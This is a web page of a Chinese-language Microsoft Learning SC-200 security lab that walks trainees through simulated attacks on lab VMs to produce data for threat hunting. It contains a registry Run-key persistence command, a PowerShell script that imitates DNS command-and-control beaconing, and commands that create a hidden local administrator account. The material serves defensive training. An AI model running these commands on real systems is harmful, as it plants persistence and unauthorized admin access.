<!DOCTYPE html><html lang="en"><head>
        <title>
            SC-200T00CN-Microsoft-Security-Operations-Analyst
        </title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">
        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/vs.min.css">
        <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        <script>hljs.initHighlightingOnLoad();</script>
        <link rel="stylesheet" href="../../assets/css/style_v%3D.css">
    </head>
    <body data-spy="scroll" data-target="#linksMenu">
    <nav class="navbar navbar-expand-lg navbar-dark bg-black">
        <div class="container d-flex justify-content-between">
            <a class="my-1 title text-azure text-uppercase" href="../../">
                SC-200T00CN-Microsoft-Security-Operations-Analyst
            </a>
            <a href="https://github.com/MicrosoftLearning/SC-200T00CN-Microsoft-Security-Operations-Analyst" target="_blank" class="btn btn-sm btn-outline-secondary text-light">
                <i class="fa fa-github" aria-hidden="true"></i>
                <span class="ml-2">GitHub</span>
            </a>
        </div>
    </nav>
    <div class="container">
        <main class="row extra-padding">
            <aside class="col-sm-2">       
                <nav id="linksMenu" class="toc sticky-top">
                    <ul class="nav navbar-nav flex-column">
                    <li class="nav-item"><a class="nav-link" href="#任务-1攻击配置了-defender-for-endpoint-的-windows">任务 1：攻击配置了 Defender for Endpoint 的 Windows。</a></li><li class="nav-item"><a class="nav-link active" href="#任务-2攻击配置了-sysmon-的-windows">任务 2：攻击配置了 Sysmon 的 Windows</a></li></ul>
                </nav>         
            </aside>
            <hr class>
            <article class="col-sm-10 mb-5">
                <h1 id="模块-7---实验室-1---练习-5---进行攻击">模块 7 - 实验室 1 - 练习 5 - 进行攻击</h1>

<h3 id="任务-1攻击配置了-defender-for-endpoint-的-windows">任务 1：攻击配置了 Defender for Endpoint 的 Windows。</h3>

<p>在此任务中，你将在配置了 Microsoft Defender for Endpoint 的主机执行攻击。</p>

<ol>
  <li>
    <p>使用以下密码以管理员身份登录到 WIN1 虚拟机：<strong>Pa55w.rd</strong>。</p>
  </li>
  <li>
    <p>在任务栏的搜索框中，输入“<em>Command</em>”。  命令提示符将显示在搜索结果中。  右键单击命令提示符，并选择“<strong>以管理员身份运行</strong>”。在出现的“<strong>用户帐户控件</strong>”窗口中选择“<strong>是</strong>”，以允许应用运行。</p>
  </li>
  <li>在命令提示符中，在每一行中输入命令，并在每一行后按 Enter 键：
    <div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock0" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock0" class="mt-0"><code class="hljs bash"><span class="hljs-built_in">cd</span> \
mkdir temp
<span class="hljs-built_in">cd</span> temp
</code></pre>
  </li>
  <li>攻击 1 - 复制并运行此命令：</li>
</ol>

<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock1" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock1" class="mt-0"><code class="hljs nginx"><span class="hljs-attribute">REG</span> ADD <span class="hljs-string">"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> /V <span class="hljs-string">"SOC Test"</span> /t REG_SZ /F /D <span class="hljs-string">"C:\temp\startup.bat"</span>
</code></pre>

<ol>
  <li>攻击 3 - 复制并运行此命令：</li>
</ol>

<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock2" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock2" class="mt-0"><code class="hljs css"><span class="hljs-selector-tag">notepad</span> <span class="hljs-selector-tag">c2</span><span class="hljs-selector-class">.ps1</span>
</code></pre>
<p>选择“<strong>是</strong>”来创建一个新文件，并将下面的 PowerShell 脚本复制到 <em>c2.ps1</em> 中。</p>

<p><strong>备注</strong>：粘贴到虚拟机中的长度可能有限。如果无法直接从说明复制，请将此代码分为三部分进行粘贴，确保将脚本全部粘贴到虚拟机中。  确保脚本在记事本 <em>c2.ps1</em> 文件中的外观与在这些说明中一致。</p>

<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock3" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock3" class="mt-0"><code class="hljs bash">param(
    [string]<span class="hljs-variable">$Domain</span> = <span class="hljs-string">"microsoft.com"</span>,
    [string]<span class="hljs-variable">$Subdomain</span> = <span class="hljs-string">"subdomain"</span>,
    [string]<span class="hljs-variable">$Sub2domain</span> = <span class="hljs-string">"sub2domain"</span>,
    [string]<span class="hljs-variable">$Sub3domain</span> = <span class="hljs-string">"sub3domain"</span>,
    [string]<span class="hljs-variable">$QueryType</span> = <span class="hljs-string">"TXT"</span>,
        [int]<span class="hljs-variable">$C2Interval</span> = 8,
        [int]<span class="hljs-variable">$C2Jitter</span> = 20,
        [int]<span class="hljs-variable">$RunTime</span> = 240
)

<span class="hljs-variable">$RunStart</span> = Get-Date
<span class="hljs-variable">$RunEnd</span> = <span class="hljs-variable">$RunStart</span>.addminutes(<span class="hljs-variable">$RunTime</span>)

<span class="hljs-variable">$x2</span> = 1
<span class="hljs-variable">$x3</span> = 1 
Do {
    <span class="hljs-variable">$TimeNow</span> = Get-Date
    Resolve-DnsName -<span class="hljs-built_in">type</span> <span class="hljs-variable">$QueryType</span> <span class="hljs-variable">$Subdomain</span><span class="hljs-string">".<span class="hljs-variable">$(Get-Random -Minimum 1 -Maximum 999999)</span>."</span><span class="hljs-variable">$Domain</span> -QuickTimeout

    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$x2</span> -eq 3 )
    {
        Resolve-DnsName -<span class="hljs-built_in">type</span> <span class="hljs-variable">$QueryType</span> <span class="hljs-variable">$Sub2domain</span><span class="hljs-string">".<span class="hljs-variable">$(Get-Random -Minimum 1 -Maximum 999999)</span>."</span><span class="hljs-variable">$Domain</span> -QuickTimeout
         <span class="hljs-variable">$x2</span> = 1
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-variable">$x2</span> = <span class="hljs-variable">$x2</span> + 1
    }
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$x3</span> -eq 7 )
    {
        Resolve-DnsName -<span class="hljs-built_in">type</span> <span class="hljs-variable">$QueryType</span> <span class="hljs-variable">$Sub3domain</span><span class="hljs-string">".<span class="hljs-variable">$(Get-Random -Minimum 1 -Maximum 999999)</span>."</span><span class="hljs-variable">$Domain</span> -QuickTimeout
        <span class="hljs-variable">$x3</span> = 1
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-variable">$x3</span> = <span class="hljs-variable">$x3</span> + 1
    }

    <span class="hljs-variable">$Jitter</span> = ((Get-Random -Minimum -<span class="hljs-variable">$C2Jitter</span> -Maximum <span class="hljs-variable">$C2Jitter</span>) / 100 + 1) +<span class="hljs-variable">$C2Interval</span>
    Start-Sleep -Seconds <span class="hljs-variable">$Jitter</span>
}
Until (<span class="hljs-variable">$TimeNow</span> -ge <span class="hljs-variable">$RunEnd</span>)
</code></pre>

<p>在“<strong>记事本</strong>”菜单中，选择“<strong>文件</strong>”，然后选择“<strong>保存</strong>”。在命令提示符窗口，通过在每一行后按 Enter 键，在每一行中输入以下命令：</p>

<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock4" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock4" class="mt-0"><code class="hljs css"><span class="hljs-selector-tag">powershell</span>
.\<span class="hljs-selector-tag">c2</span><span class="hljs-selector-class">.ps1</span>
</code></pre>

<p><strong>备注</strong>：你将看到解析错误。这在预料之中。
<strong>重要提示：</strong> 请勿关闭此窗口。让此命令/powershell 脚本在后台运行。该命令需要在数小时内生成日志条目。在此脚本运行期间，你可以继续进行下一项任务和下一个练习。此任务创建的数据稍后将在威胁搜寻中使用。此过程不会创造大量的数据或处理。</p>

<h3 id="任务-2攻击配置了-sysmon-的-windows">任务 2：攻击配置了 Sysmon 的 Windows</h3>

<p>在此任务中，你将在配置了安全事件连接器和 Sysmon 的主机上执行攻击。</p>

<ol>
  <li>
    <p>以管理员身份使用密码登录到 WIN2 虚拟机：<strong>Pa55w.rd</strong>。</p>
  </li>
  <li>
    <p>在任务栏的搜索框中，输入“<em>CMD</em>”。 命令提示符将显示在搜索结果中。  右键单击命令提示符，并选择“<strong>以管理员身份运行</strong>”。  接收显示的任何用户帐户控制提示。</p>
  </li>
  <li>
    <p>在命令提示符中，在每一行中输入命令，并在每一行后按 Enter 键：</p>
  </li>
</ol>

<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock5" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock5" class="mt-0"><code class="hljs bash"><span class="hljs-built_in">cd</span> \
mkdir temp
<span class="hljs-built_in">cd</span> \temp
</code></pre>

<ol>
  <li>攻击 1 - 将此命令复制到命令提示符应用并运行此命令：</li>
</ol>

<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock6" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock6" class="mt-0"><code class="hljs nginx"><span class="hljs-attribute">REG</span> ADD <span class="hljs-string">"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> /V <span class="hljs-string">"SOC Test"</span> /t REG_SZ /F /D <span class="hljs-string">"C:\temp\startup.bat"</span>
</code></pre>

<ol>
  <li>攻击 2 - 复制并运行此命令，在每一行中输入命令，并在每一行后按 Enter 键：</li>
</ol>

<div class="code-header mt-3 mb-0 bg-light d-flex justify-content-between border"><span class="mx-2 text-muted text-capitalize font-weight-light">code</span><button class="m-0 btn btn-code btn-sm btn-light codeBtn rounded-0 border-left text-muted font-weight-light" data-clipboard-target="#codeBlock7" type="button"><i class="fa fa-files-o mr-2" aria-hidden="true"></i>Copy</button></div><pre id="codeBlock7" class="mt-0"><code class="hljs cs">net user theusernametoadd /<span class="hljs-keyword">add</span>
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /<span class="hljs-keyword">add</span>
</code></pre>

<h2 id="转到练习-6">转到练习 6</h2>

            </article>
        </main>
    </div>
    <footer class="fixed-bottom d-print-none">
        <nav class="navbar navbar-light bg-light d-flex justify-content-around">
            <span class="navbar-text">
                <i class="fa fa-github" aria-hidden="true"></i>
                <a href="https://github.com/MicrosoftLearning/SC-200T00CN-Microsoft-Security-Operations-Analyst" target="_blank" class="ml-2">
                    MicrosoftLearning/SC-200T00CN-Microsoft-Security-Operations-Analyst
                </a>
            </span>
        </nav>
    </footer>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
    <script src="../../assets/js/script_v%3D.js"></script>



</body></html>